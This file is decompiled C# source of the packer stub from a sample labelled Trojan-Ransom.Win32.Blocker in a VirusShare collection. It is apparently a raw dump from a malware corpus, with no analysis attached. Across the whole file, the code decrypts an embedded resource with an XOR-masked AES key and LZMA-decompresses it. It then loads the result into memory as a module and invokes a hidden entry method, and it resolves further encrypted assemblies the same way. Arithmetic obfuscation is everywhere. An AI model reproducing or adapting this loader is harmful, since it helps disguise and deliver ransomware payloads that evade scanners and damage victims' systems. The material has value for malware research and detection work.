// Decompiled with JetBrains decompiler
// Type: CompressShell
// Assembly: avanda, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 896321C4-14AC-042B-C793-B06917C0136C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.cnpj-e5c1bb5a882c183f2c449ca5585f382d90cb2011dbd198b8c004af227f70ba2b.exe

using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

internal static class CompressShell
{
  private static string Res = "ᯥ嗮愌\uF803썵鳛냢돚";
  private static ulong Rid = (ulong) ((1560399673L + (-280367205L + 1816892037L + -372116934L) - -15375184L + -1186724022L ^ -910466721L ^ -1512604824L ^ (-2992412125L ^ -715551253L) - (-1051776046L + 1780559296L + (-479236443L - -762571292L - -476757308L) ^ -1296302016L ^ -190698485L)) - (-1696499984L ^ -1587258896L));
  private static Module Mod;

  public static uint GetLenToPosState(uint len)
  {
    len -= 2U;
    return len < 4U ? len : 3U;
  }

  private static Assembly DecryptAsm(object sender, ResolveEventArgs e)
  {
    byte[] bytes = Encoding.UTF8.GetBytes(e.Name);
    for (int index = 0; index < bytes.Length; ++index)
      bytes[index] = (byte) ((int) bytes[index] ^ -1679503395 - ((1929436120 ^ 1282135209 ^ 205914466 ^ 343409195) - 364803782 ^ 1885811772 - 897436181 + 689881653 - 140856334) - 322548438 - 1047963403 ^ index);
    Stream manifestResourceStream = typeof (CompressShell).Assembly.GetManifestResourceStream(Encoding.UTF8.GetString(bytes));
    if (manifestResourceStream == null)
      return (Assembly) null;
    byte[] asm;
    using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
      asm = binaryReader.ReadBytes((int) manifestResourceStream.Length);
    byte[] numArray = CompressShell.Decrypt(asm);
    Assembly assembly = Assembly.Load(numArray);
    Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
    return assembly;
  }

  private static Assembly ResolveResource(object sender, ResolveEventArgs e)
  {
    byte[] bytes = Encoding.UTF8.GetBytes(e.Name);
    for (int index = 0; index < bytes.Length; ++index)
      bytes[index] = (byte) ((int) bytes[index] ^ (225375609 ^ 577113399 ^ 11259849 ^ 1670190772 - 13928726) - 1293662556 ^ index);
    Stream manifestResourceStream = typeof (CompressShell).Assembly.GetManifestResourceStream(Encoding.UTF8.GetString(bytes));
    if (manifestResourceStream == null)
      return (Assembly) null;
    byte[] asm;
    using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
      asm = binaryReader.ReadBytes((int) manifestResourceStream.Length);
    byte[] numArray = CompressShell.Decrypt(asm);
    Assembly assembly = Assembly.Load(numArray);
    Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
    return assembly;
  }

  private static byte[] Decrypt(byte[] asm)
  {
    byte[] buffer1;
    byte[] rgbIV;
    byte[] rgbKey;
    using (BinaryReader binaryReader = new BinaryReader((Stream) new MemoryStream(asm)))
    {
      buffer1 = binaryReader.ReadBytes(binaryReader.ReadInt32());
      rgbIV = binaryReader.ReadBytes(binaryReader.ReadInt32());
      rgbKey = binaryReader.ReadBytes(binaryReader.ReadInt32());
    }
    int num1 = 1294031458 - 1294031398;
    for (int index = 0; index < rgbKey.Length; index += 4)
    {
      rgbKey[index] ^= (byte) (num1 & (int) byte.MaxValue);
      rgbKey[index + 1] ^= (byte) ((num1 & 965920020 - 965854740) >> 8);
      rgbKey[index + 2] ^= (byte) ((num1 & (1333345144 ^ 1334197112)) >> 16);
      rgbKey[index + 3] ^= (byte) (((long) num1 & 4278190080L) >> 411704570 - 262370539 - 149334007);
    }
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    using (CryptoStream inStream = new CryptoStream((Stream) new MemoryStream(buffer1), rijndaelManaged.CreateDecryptor(rgbKey, rgbIV), CryptoStreamMode.Read))
    {
      byte[] buffer2 = new byte[4];
      inStream.Read(buffer2, 0, 4);
      uint uint32 = BitConverter.ToUInt32(buffer2, 0);
      CompressShell.LzmaDecoder lzmaDecoder = new CompressShell.LzmaDecoder();
      byte[] numArray = new byte[5];
      inStream.Read(numArray, 0, 5);
      lzmaDecoder.SetDecoderProperties(numArray);
      long outSize = 0;
      for (int index = 0; index < 8; ++index)
      {
        int num2 = inStream.ReadByte();
        if (num2 < 0)
          throw new Exception("Can't Read 1");
        outSize |= (long) (byte) num2 << (8 * index & 911204662 - 911204599);
      }
      byte[] buffer3 = new byte[outSize];
      long inSize = (long) (uint32 - 13U);
      lzmaDecoder.Code((Stream) inStream, (Stream) new MemoryStream(buffer3, true), inSize, outSize);
      return buffer3;
    }
  }

  private static ulong modPow(ulong bas, ulong pow, ulong mod)
  {
    ulong num = 1;
    while (pow > 0UL)
    {
      if (((long) pow & 1L) != 0L)
        num = num * bas % mod;
      pow >>= 1;
      bas = bas * bas % mod;
    }
    return num;
  }

  [STAThread]
  private static int Main(string[] args)
  {
    Assembly entryAssembly = Assembly.GetEntryAssembly();
    Stream manifestResourceStream = entryAssembly.GetManifestResourceStream(CompressShell.Res);
    byte[] asm;
    using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
      asm = binaryReader.ReadBytes((int) manifestResourceStream.Length);
    byte[] numArray = CompressShell.Decrypt(asm);
    CompressShell.Mod = entryAssembly.LoadModule("___.netmodule", numArray);
    Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
    AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(CompressShell.DecryptAsm);
    MethodBase methodBase = CompressShell.Mod.ResolveMethod((1679135129 ^ 1144954741) - (1061200810 ^ 672826730 + 239130881 ^ 1579038814 - 1257063729) | (int) CompressShell.modPow(CompressShell.Rid, (ulong) (1351145770 - 1351145699), (ulong) (-1575169803L + ((2535105640L ^ 611909357L + 1173624126L + -1754824905L) - -1528834116L + -1961110458L))));
    object obj;
    if (methodBase.GetParameters().Length == 1)
      obj = methodBase.Invoke((object) null, new object[1]
      {
        (object) args
      });
    else
      obj = methodBase.Invoke((object) null, (object[]) null);
    return obj is int num ? num : 0;
  }

  public struct State
  {
    public uint Index;

    public void Init() => this.Index = 0U;

    public void UpdateChar()
    {
      if (this.Index < 4U)
        this.Index = 0U;
      else if (this.Index < 10U)
        this.Index -= 3U;
      else
        this.Index -= 6U;
    }

    public void UpdateMatch() => this.Index = this.Index < 7U ? 7U : 10U;

    public void UpdateRep() => this.Index = this.Index < 7U ? 8U : 11U;

    public void UpdateShortRep() => this.Index = this.Index < 7U ? 9U : 11U;

    public bool IsCharState() => this.Index < 7U;
  }

  public class OutWindow
  {
    private byte[] _buffer;
    private uint _pos;
    private uint _windowSize;
    private uint _streamPos;
    private Stream _stream;

    public void Create(uint windowSize)
    {
      if ((int) this._windowSize != (int) windowSize)
        this._buffer = new byte[(IntPtr) windowSize];
      this._windowSize = windowSize;
      this._pos = 0U;
      this._streamPos = 0U;
    }

    public void Init(Stream stream, bool solid)
    {
      this.ReleaseStream();
      this._stream = stream;
      if (solid)
        return;
      this._streamPos = 0U;
      this._pos = 0U;
    }

    public void ReleaseStream()
    {
      this.Flush();
      this._stream = (Stream) null;
      Buffer.BlockCopy((Array) new byte[this._buffer.Length], 0, (Array) this._buffer, 0, this._buffer.Length);
    }

    public void Flush()
    {
      uint count = this._pos - this._streamPos;
      if (count == 0U)
        return;
      this._stream.Write(this._buffer, (int) this._streamPos, (int) count);
      if (this._pos >= this._windowSize)
        this._pos = 0U;
      this._streamPos = this._pos;
    }

    public void CopyBlock(uint distance, uint len)
    {
      uint num = (uint) ((int) this._pos - (int) distance - 1);
      if (num >= this._windowSize)
        num += this._windowSize;
      for (; len > 0U; --len)
      {
        if (num >= this._windowSize)
          num = 0U;
        this._buffer[(IntPtr) this._pos++] = this._buffer[(IntPtr) num++];
        if (this._pos >= this._windowSize)
          this.Flush();
      }
    }

    public void PutByte(byte b)
    {
      this._buffer[(IntPtr) this._pos++] = b;
      if (this._pos < this._windowSize)
        return;
      this.Flush();
    }

    public byte GetByte(uint distance)
    {
      uint index = (uint) ((int) this._pos - (int) distance - 1);
      if (index >= this._windowSize)
        index += this._windowSize;
      return this._buffer[(IntPtr) index];
    }
  }

  private class Decoder
  {
    public uint Range;
    public uint Code;
    public Stream Stream;

    public void Init(Stream stream)
    {
      this.Stream = stream;
      this.Code = 0U;
      this.Range = uint.MaxValue;
      for (int index = 0; index < 5; ++index)
        this.Code = this.Code << 8 | (uint) (byte) this.Stream.ReadByte();
    }

    public void ReleaseStream() => this.Stream = (Stream) null;

    public void Normalize()
    {
      for (; this.Range < (uint) (-1807901165 - (788175223 - ((-1151364396 - 1531215881 ^ 508149581 + 1518714816 - (-1886848023 - 1321219395)) - 535597772 - 896468199)) - (-567947288 - (-2065359822 - ((2107266824 - 1520442703 - ((653329504 ^ -943434340 - (-239240236 - 1972614274)) - 1380106791) ^ (1362248414 ^ 556909621) - 1194780754) + (-1147385453 - ((1723857799 ^ 718596249) + 569098236)) - 1855914441)))); this.Range <<= 8)
        this.Code = this.Code << 8 | (uint) (byte) this.Stream.ReadByte();
    }

    public uint DecodeDirectBits(int numTotalBits)
    {
      uint range = this.Range;
      uint num1 = this.Code;
      uint num2 = 0;
      for (int index = numTotalBits; index > 0; --index)
      {
        range >>= 1;
        uint num3 = num1 - range >> (822198814 ^ 1585329006 ^ 1518845797 + 351810058);
        num1 -= range & num3 - 1U;
        num2 = (uint) ((int) num2 << 1 | 1 - (int) num3);
        if (range < (uint) (-1413277637 - 1700771966 ^ 390549636 ^ ((1308046028 ^ 466724915) - 378455010 ^ 881568175) + (738069194 + 420054461)))
        {
          num1 = num1 << 8 | (uint) (byte) this.Stream.ReadByte();
          range <<= 8;
        }
      }
      this.Range = range;
      this.Code = num1;
      return num2;
    }
  }

  private struct BitDecoder
  {
    private uint Prob;

    public void Init() => this.Prob = (uint) (-886179482 - (2141962359 - 306316441) - 33913793 - (1605022203 - ((1143434336 ^ 615941417) - (1992432798 ^ 1414034131))) ^ -1644662626 - (-1630155937 - ((1711151847 + (-1949296846 - 350527154 - 1723068036) ^ 201375807 ^ -1863806636 - 1806983561 + 1043076277) + (-1627168365 - 1110252728 - 978141553)) - 1096613805) ^ -1982434432 - (1889406137 - 831153218) - 75269263);

    public uint Decode(CompressShell.Decoder rangeDecoder)
    {
      uint num = (rangeDecoder.Range >> 11) * this.Prob;
      if (rangeDecoder.Code < num)
      {
        rangeDecoder.Range = num;
        this.Prob += (uint) (987846965 - (404854599 + (411747229 + 297247363) ^ (-1987279381 - (398291884 ^ 1007747101) ^ 710955265 ^ 1223456333) + (1590142560 ^ 1748837920)) - (1363488786 - 1248405422)) - this.Prob >> 5;
        if (rangeDecoder.Range < 16777216U)
        {
          rangeDecoder.Code = rangeDecoder.Code << 8 | (uint) (byte) rangeDecoder.Stream.ReadByte();
          rangeDecoder.Range <<= 8;
        }
        return 0;
      }
      rangeDecoder.Range -= num;
      rangeDecoder.Code -= num;
      this.Prob -= this.Prob >> 5;
      if (rangeDecoder.Range < (uint) (1567323263 - 1550546047))
      {
        rangeDecoder.Code = rangeDecoder.Code << 8 | (uint) (byte) rangeDecoder.Stream.ReadByte();
        rangeDecoder.Range <<= 8;
      }
      return 1;
    }
  }

  private struct BitTreeDecoder
  {
    private CompressShell.BitDecoder[] Models;
    private int NumBitLevels;

    public BitTreeDecoder(int numBitLevels)
    {
      this.NumBitLevels = numBitLevels;
      this.Models = new CompressShell.BitDecoder[1 << (numBitLevels & (-1294785125 - (1266073733 - 39720181) + ((2016132316 ^ 1736052132 ^ 2016657847 ^ 179780491) - 1534752422) ^ 730190165 + (2072264558 ^ 1591068136) - 932017381) - (-1532805799 - ((54824843 ^ 600038138 + (216200257 + 975591019) ^ 138263535) - (1166514869 - 410945150 ^ 1372327639 ^ (-786281804 - 1564302073 ^ 1149358802) + (1500589624 - 496029261)) + (1498517243 - 207051781 ^ 1555146752 ^ 967404898 ^ 78516639))) - 1077693184)];
    }

    public void Init()
    {
      for (uint index = 1; (long) index < (long) (1 << (this.NumBitLevels & ((116815458 ^ 999604521 + 351821147) - 779242127 ^ -1766145747 - (1210913660 - 678626683) - 211812495 ^ (1718012062 - 831222286 ^ 53037293 ^ 211943114 ^ 608546846) - 51023628 + (-1755249724 - (650429564 ^ 1191083777 - 1112460079) ^ -1368700755 - (384283513 + 1155214854))))); ++index)
        this.Models[(IntPtr) index].Init();
    }

    public uint Decode(CompressShell.Decoder rangeDecoder)
    {
      uint index = 1;
      for (int numBitLevels = this.NumBitLevels; numBitLevels > 0; --numBitLevels)
        index = (index << 1) + this.Models[(IntPtr) index].Decode(rangeDecoder);
      return index - (uint) (1 << (this.NumBitLevels & -2100035579 - (2056571903 - 1882058222) - (((1889073394 ^ 1057682424) - (1350186407 + (-504241541 - (590117394 ^ 1562566248) - 935540109) - 1374733625) ^ 2060596830 - 1699019675) - ((1078136478 ^ 1023131640) - 2064825847 + 1803023354 ^ -1265464553 - (1612431424 - 623180236) - 64949215) - 194809816) - ((344996412 ^ 1929802783) - 767826929 ^ 510725079 + (1750090450 - 652705289 ^ 1968081487))));
    }

    public uint ReverseDecode(CompressShell.Decoder rangeDecoder)
    {
      uint index1 = 1;
      uint num1 = 0;
      for (int index2 = 0; index2 < this.NumBitLevels; ++index2)
      {
        uint num2 = this.Models[(IntPtr) index1].Decode(rangeDecoder);
        index1 = (index1 << 1) + num2;
        num1 |= num2 << (index2 & (-1053072378 - (-1854118543 - (-2054502359 - (108621071 + (1678032205 ^ -2053873977 - (1694476982 - (1359477811 - 663785573 ^ 2104591044)))) - 856427776)) ^ 1368550815 - (1595028394 - 157292405 - 866510889) + 421200884 + (440662768 + 138408911)));
      }
      return num1;
    }

    public static uint ReverseDecode(
      CompressShell.BitDecoder[] Models,
      uint startIndex,
      CompressShell.Decoder rangeDecoder,
      int NumBitLevels)
    {
      uint num1 = 1;
      uint num2 = 0;
      for (int index = 0; index < NumBitLevels; ++index)
      {
        uint num3 = Models[(IntPtr) (startIndex + num1)].Decode(rangeDecoder);
        num1 = (num1 << 1) + num3;
        num2 |= num3 << (index & ((1945181591 ^ 487347092) - 689890998 ^ 1673674746 - 1021849514 ^ 488826551 + (938714258 - 495525048) + ((961745968 - 449148106 ^ 827174447) - 151579814) + (-1869867264 - 1081311868 - 279159111 + (541581739 ^ -2120326974 - 2105972831) - (565663241 + 523939149) - (246462543 + (-1786606811 - 438788209 - 1838233413 + 26782243)))));
      }
      return num2;
    }
  }

  public class LzmaDecoder
  {
    private CompressShell.OutWindow m_OutWindow = new CompressShell.OutWindow();
    private CompressShell.Decoder m_RangeDecoder = new CompressShell.Decoder();
    private CompressShell.BitDecoder[] m_IsMatchDecoders = new CompressShell.BitDecoder[(IntPtr) (uint) (1022158957 - 1022158765)];
    private CompressShell.BitDecoder[] m_IsRepDecoders = new CompressShell.BitDecoder[new IntPtr(12)];
    private CompressShell.BitDecoder[] m_IsRepG0Decoders = new CompressShell.BitDecoder[new IntPtr(12)];
    private CompressShell.BitDecoder[] m_IsRepG1Decoders = new CompressShell.BitDecoder[new IntPtr(12)];
    private CompressShell.BitDecoder[] m_IsRepG2Decoders = new CompressShell.BitDecoder[new IntPtr(12)];
    private CompressShell.BitDecoder[] m_IsRep0LongDecoders = new CompressShell.BitDecoder[new IntPtr(192)];
    private CompressShell.BitTreeDecoder[] m_PosSlotDecoder = new CompressShell.BitTreeDecoder[new IntPtr(4)];
    private CompressShell.BitDecoder[] m_PosDecoders = new CompressShell.BitDecoder[(IntPtr) (uint) (-1721813082 - ((1188527840 ^ 1640723761) + 363384902) - ((2105202180 ^ 1276324166) + 724589531))];
    private CompressShell.BitTreeDecoder m_PosAlignDecoder = new CompressShell.BitTreeDecoder(4);
    private CompressShell.LzmaDecoder.LenDecoder m_LenDecoder = new CompressShell.LzmaDecoder.LenDecoder();
    private CompressShell.LzmaDecoder.LenDecoder m_RepLenDecoder = new CompressShell.LzmaDecoder.LenDecoder();
    private CompressShell.LzmaDecoder.LiteralDecoder m_LiteralDecoder = new CompressShell.LzmaDecoder.LiteralDecoder();
    private uint m_DictionarySize;
    private uint m_DictionarySizeCheck;
    private uint m_PosStateMask;
    private bool _solid;

    public LzmaDecoder()
    {
      this.m_DictionarySize = uint.MaxValue;
      for (int index = 0; index < 4; ++index)
        this.m_PosSlotDecoder[index] = new CompressShell.BitTreeDecoder(6);
    }

    private void SetDictionarySize(uint dictionarySize)
    {
      if ((int) this.m_DictionarySize == (int) dictionarySize)
        return;
      this.m_DictionarySize = dictionarySize;
      this.m_DictionarySizeCheck = Math.Max(this.m_DictionarySize, 1U);
      this.m_OutWindow.Create(Math.Max(this.m_DictionarySizeCheck, (uint) (1730313043 - 811212143 + (2037904136 ^ -882596411 - (534815166 ^ -1163415937 - (384909174 ^ 1587744777)) + 114058892) - 1395391809 ^ -1698500576 - 2110995380 - 474383662)));
    }

    private void SetLiteralProperties(int lp, int lc) => this.m_LiteralDecoder.Create(lp, lc);

    private void SetPosBitsProperties(int pb)
    {
      uint numPosStates = (uint) (1 << (pb & 492988782 + (671266086 + ((1203686411 + 515299225 ^ 1392891346) - 886945700) + (-1915859897 - 1118400593) - 1055838803) + (2096121271 - 961362521 - 745862058 + (-1256143908 - 1834927902) - (2126746047 - 1545027189 - 4251633 ^ 301366853) ^ 597780746 - (444837779 + 1133327304 ^ 1096251024 ^ -1997221573 - (-538131383 - (1039007163 ^ 1515392716)) ^ 378239961)) - (239397123 + 1705999296)));
      this.m_LenDecoder.Create(numPosStates);
      this.m_RepLenDecoder.Create(numPosStates);
      this.m_PosStateMask = numPosStates - 1U;
    }

    private void Init(Stream inStream, Stream outStream)
    {
      this.m_RangeDecoder.Init(inStream);
      this.m_OutWindow.Init(outStream, this._solid);
      for (uint index1 = 0; index1 < 12U; ++index1)
      {
        for (uint index2 = 0; index2 <= this.m_PosStateMask; ++index2)
        {
          uint index3 = (index1 << 4) + index2;
          this.m_IsMatchDecoders[(IntPtr) index3].Init();
          this.m_IsRep0LongDecoders[(IntPtr) index3].Init();
        }
        this.m_IsRepDecoders[(IntPtr) index1].Init();
        this.m_IsRepG0Decoders[(IntPtr) index1].Init();
        this.m_IsRepG1Decoders[(IntPtr) index1].Init();
        this.m_IsRepG2Decoders[(IntPtr) index1].Init();
      }
      this.m_LiteralDecoder.Init();
      for (uint index = 0; index < 4U; ++index)
        this.m_PosSlotDecoder[(IntPtr) index].Init();
      for (uint index = 0; index < 114U; ++index)
        this.m_PosDecoders[(IntPtr) index].Init();
      this.m_LenDecoder.Init();
      this.m_RepLenDecoder.Init();
      this.m_PosAlignDecoder.Init();
    }

    public void Code(Stream inStream, Stream outStream, long inSize, long outSize)
    {
      this.Init(inStream, outStream);
      CompressShell.State state = new CompressShell.State();
      state.Init();
      uint distance = 0;
      uint num1 = 0;
      uint num2 = 0;
      uint num3 = 0;
      ulong pos = 0;
      ulong num4 = (ulong) outSize;
      if (pos < num4)
      {
        if (this.m_IsMatchDecoders[(IntPtr) (state.Index << 4)].Decode(this.m_RangeDecoder) != 0U)
          throw new Exception();
        state.UpdateChar();
        this.m_OutWindow.PutByte(this.m_LiteralDecoder.DecodeNormal(this.m_RangeDecoder, 0U, (byte) 0));
        ++pos;
      }
      while (pos < num4)
      {
        uint posState = (uint) pos & this.m_PosStateMask;
        if (this.m_IsMatchDecoders[(IntPtr) ((state.Index << 4) + posState)].Decode(this.m_RangeDecoder) == 0U)
        {
          byte prevByte = this.m_OutWindow.GetByte(0U);
          this.m_OutWindow.PutByte(state.IsCharState() ? this.m_LiteralDecoder.DecodeNormal(this.m_RangeDecoder, (uint) pos, prevByte) : this.m_LiteralDecoder.DecodeWithMatchByte(this.m_RangeDecoder, (uint) pos, prevByte, this.m_OutWindow.GetByte(distance)));
          state.UpdateChar();
          ++pos;
        }
        else
        {
          uint len;
          if (this.m_IsRepDecoders[(IntPtr) state.Index].Decode(this.m_RangeDecoder) == 1U)
          {
            if (this.m_IsRepG0Decoders[(IntPtr) state.Index].Decode(this.m_RangeDecoder) == 0U)
            {
              if (this.m_IsRep0LongDecoders[(IntPtr) ((state.Index << 4) + posState)].Decode(this.m_RangeDecoder) == 0U)
              {
                state.UpdateShortRep();
                this.m_OutWindow.PutByte(this.m_OutWindow.GetByte(distance));
                ++pos;
                continue;
              }
            }
            else
            {
              uint num5;
              if (this.m_IsRepG1Decoders[(IntPtr) state.Index].Decode(this.m_RangeDecoder) == 0U)
              {
                num5 = num1;
              }
              else
              {
                if (this.m_IsRepG2Decoders[(IntPtr) state.Index].Decode(this.m_RangeDecoder) == 0U)
                {
                  num5 = num2;
                }
                else
                {
                  num5 = num3;
                  num3 = num2;
                }
                num2 = num1;
              }
              num1 = distance;
              distance = num5;
            }
            len = this.m_RepLenDecoder.Decode(this.m_RangeDecoder, posState) + 2U;
            state.UpdateRep();
          }
          else
          {
            num3 = num2;
            num2 = num1;
            num1 = distance;
            len = 2U + this.m_LenDecoder.Decode(this.m_RangeDecoder, posState);
            state.UpdateMatch();
            uint num6 = this.m_PosSlotDecoder[(IntPtr) CompressShell.GetLenToPosState(len)].Decode(this.m_RangeDecoder);
            if (num6 >= 4U)
            {
              int NumBitLevels = (int) (num6 >> 1) - 1;
              uint num7 = (uint) ((2 | (int) num6 & 1) << (NumBitLevels & (1578382498 - 624594182 ^ 1641975832 - 688187541)));
              distance = num6 >= 14U ? num7 + (this.m_RangeDecoder.DecodeDirectBits(NumBitLevels - 4) << 4) + this.m_PosAlignDecoder.ReverseDecode(this.m_RangeDecoder) : num7 + CompressShell.BitTreeDecoder.ReverseDecode(this.m_PosDecoders, (uint) ((int) num7 - (int) num6 - 1), this.m_RangeDecoder, NumBitLevels);
            }
            else
              distance = num6;
          }
          if ((ulong) distance < pos && distance < this.m_DictionarySizeCheck || distance != uint.MaxValue)
          {
            this.m_OutWindow.CopyBlock(distance, len);
            pos += (ulong) len;
          }
          else
            break;
        }
      }
      this.m_OutWindow.Flush();
      this.m_OutWindow.ReleaseStream();
      this.m_RangeDecoder.ReleaseStream();
    }

    public void SetDecoderProperties(byte[] properties)
    {
      int lc = (int) properties[0] % 9;
      int num = (int) properties[0] / 9;
      int lp = num % 5;
      int pb = num / 5;
      uint dictionarySize = 0;
      for (int index = 0; index < 4; ++index)
        dictionarySize += (uint) properties[1 + index] << (index * 8 & (-286034349 - 1910593802 ^ 1813073771 - 1680339265) - (810694629 - 7274621 + (734823535 - (-1580552913 - (621590287 + 1443329227)) ^ 196615913 ^ 589498508 + 1265860157 - 685797530)));
      this.SetDictionarySize(dictionarySize);
      this.SetLiteralProperties(lp, lc);
      this.SetPosBitsProperties(pb);
    }

    private class LenDecoder
    {
      private CompressShell.BitDecoder m_Choice = new CompressShell.BitDecoder();
      private CompressShell.BitDecoder m_Choice2 = new CompressShell.BitDecoder();
      private CompressShell.BitTreeDecoder[] m_LowCoder = new CompressShell.BitTreeDecoder[new IntPtr(16)];
      private CompressShell.BitTreeDecoder[] m_MidCoder = new CompressShell.BitTreeDecoder[new IntPtr(16)];
      private CompressShell.BitTreeDecoder m_HighCoder = new CompressShell.BitTreeDecoder(8);
      private uint m_NumPosStates;

      public void Create(uint numPosStates)
      {
        for (uint numPosStates1 = this.m_NumPosStates; numPosStates1 < numPosStates; ++numPosStates1)
        {
          this.m_LowCoder[(IntPtr) numPosStates1] = new CompressShell.BitTreeDecoder(3);
          this.m_MidCoder[(IntPtr) numPosStates1] = new CompressShell.BitTreeDecoder(3);
        }
        this.m_NumPosStates = numPosStates;
      }

      public void Init()
      {
        this.m_Choice.Init();
        for (uint index = 0; index < this.m_NumPosStates; ++index)
        {
          this.m_LowCoder[(IntPtr) index].Init();
          this.m_MidCoder[(IntPtr) index].Init();
        }
        this.m_Choice2.Init();
        this.m_HighCoder.Init();
      }

      public uint Decode(CompressShell.Decoder rangeDecoder, uint posState)
      {
        if (this.m_Choice.Decode(rangeDecoder) == 0U)
          return this.m_LowCoder[(IntPtr) posState].Decode(rangeDecoder);
        uint num = 8;
        return this.m_Choice2.Decode(rangeDecoder) != 0U ? num + 8U + this.m_HighCoder.Decode(rangeDecoder) : num + this.m_MidCoder[(IntPtr) posState].Decode(rangeDecoder);
      }
    }

    private class LiteralDecoder
    {
      private CompressShell.LzmaDecoder.LiteralDecoder.Decoder2[] m_Coders;
      private int m_NumPrevBits;
      private int m_NumPosBits;
      private uint m_PosMask;

      public void Create(int numPosBits, int numPrevBits)
      {
        if (this.m_Coders != null && this.m_NumPrevBits == numPrevBits && this.m_NumPosBits == numPosBits)
          return;
        this.m_NumPosBits = numPosBits;
        this.m_PosMask = (uint) ((1 << numPosBits) - 1);
        this.m_NumPrevBits = numPrevBits;
        uint length = (uint) (1 << (this.m_NumPrevBits + this.m_NumPosBits & -1400382160 - (-1686808127 - 893249479) - (1342475435 - 162800020)));
        this.m_Coders = new CompressShell.LzmaDecoder.LiteralDecoder.Decoder2[(IntPtr) length];
        for (uint index = 0; index < length; ++index)
          this.m_Coders[(IntPtr) index].Create();
      }

      public void Init()
      {
        uint num = (uint) (1 << (this.m_NumPrevBits + this.m_NumPosBits & (-1123026864 - (1260903495 ^ 1976491620 ^ 564762512 + 930051891) - 214942629 - 1103455321 ^ (-1979851579 - 255612921 ^ 1623778052) - (1161213839 - 53005958 - 645270733 ^ 1092110303 - 942591864))));
        for (uint index = 0; index < num; ++index)
          this.m_Coders[(IntPtr) index].Init();
      }

      private uint GetState(uint pos, byte prevByte) => (uint) ((((int) pos & (int) this.m_PosMask) << (this.m_NumPrevBits & ((624817959 ^ -620076065 - 1872690107 ^ 1617642528) - (2023773502 - (-1129321696 - 2086521514) ^ 633238707 ^ -1487164545 - (-1401799478 - 1531790439) ^ -1592362393 - 1568465313) ^ 635334557))) + ((int) prevByte >> (8 - this.m_NumPrevBits & (392464651 + (-2061736142 - (417882203 + ((292384426 ^ 2092075816) - 192491607))) ^ 347326709 ^ 897716829))));

      public byte DecodeNormal(CompressShell.Decoder rangeDecoder, uint pos, byte prevByte) => this.m_Coders[(IntPtr) this.GetState(pos, prevByte)].DecodeNormal(rangeDecoder);

      public byte DecodeWithMatchByte(
        CompressShell.Decoder rangeDecoder,
        uint pos,
        byte prevByte,
        byte matchByte)
      {
        return this.m_Coders[(IntPtr) this.GetState(pos, prevByte)].DecodeWithMatchByte(rangeDecoder, matchByte);
      }

      private struct Decoder2
      {
        private CompressShell.BitDecoder[] m_Decoders;

        public void Create() => this.m_Decoders = new CompressShell.BitDecoder[-1603138929 - ((1898488874 ^ 1962783828) + 128595328 + 112389967 + (-682024513 - ((211381477 ^ 1756921883 - 149978575 ^ -2084312064 - (-2087354613 - (1166976035 - 982233466)) + 1457257938) + (48148708 + (484936799 + 748536748)))) - (1208182033 + 143257071 - 670207315)) - 1219667886 - 311362378];

        public void Init()
        {
          for (int index = 0; index < -1669078986 - (638595147 + 192234991) - ((2079888482 ^ 1219754099) - ((-996275702 - 1545379604 ^ (1973029849 - 752806266 ^ 1395934260) + (1645984205 - 1203292755)) - (579226253 + 954857576)) - (-1742742174 - 1910272640)) - (-1470697463 - 1391050627 - 1102540490 + ((2014238835 ^ 1275272032) - 261853386 - (1150866299 - 545740216))) - 1273162665; ++index)
            this.m_Decoders[index].Init();
        }

        public byte DecodeNormal(CompressShell.Decoder rangeDecoder)
        {
          uint index = 1;
          do
          {
            index = index << 1 | this.m_Decoders[(IntPtr) index].Decode(rangeDecoder);
          }
          while (index < (uint) ((-1318294419 - 2021828656 ^ (373328411 ^ 2064661438) - 1301429089 ^ -1020054201 - 1567777408 ^ 344361743) - 586922889 ^ -2098662631 - (1603016015 - 1503612753 ^ 2087854370 - 1413623031 ^ 910722267) - 877071587));
          return (byte) index;
        }

        public byte DecodeWithMatchByte(CompressShell.Decoder rangeDecoder, byte matchByte)
        {
          uint index = 1;
          do
          {
            uint num1 = (uint) ((int) matchByte >> 7 & 1);
            matchByte <<= 1;
            uint num2 = this.m_Decoders[(IntPtr) ((uint) (1 + (int) num1 << 8) + index)].Decode(rangeDecoder);
            index = index << 1 | num2;
            if ((int) num1 != (int) num2)
            {
              while (index < (uint) ((1121234918 ^ 112565374) - (1792590626 ^ -1479175329 - 1448858034 ^ 2143301655)))
                index = index << 1 | this.m_Decoders[(IntPtr) index].Decode(rangeDecoder);
              break;
            }
          }
          while (index < (uint) (1454420175 - (1883671297 ^ 1058819012 + (453425721 - 358957321) - 499621926)));
          return (byte) index;
        }
      }
    }
  }
}
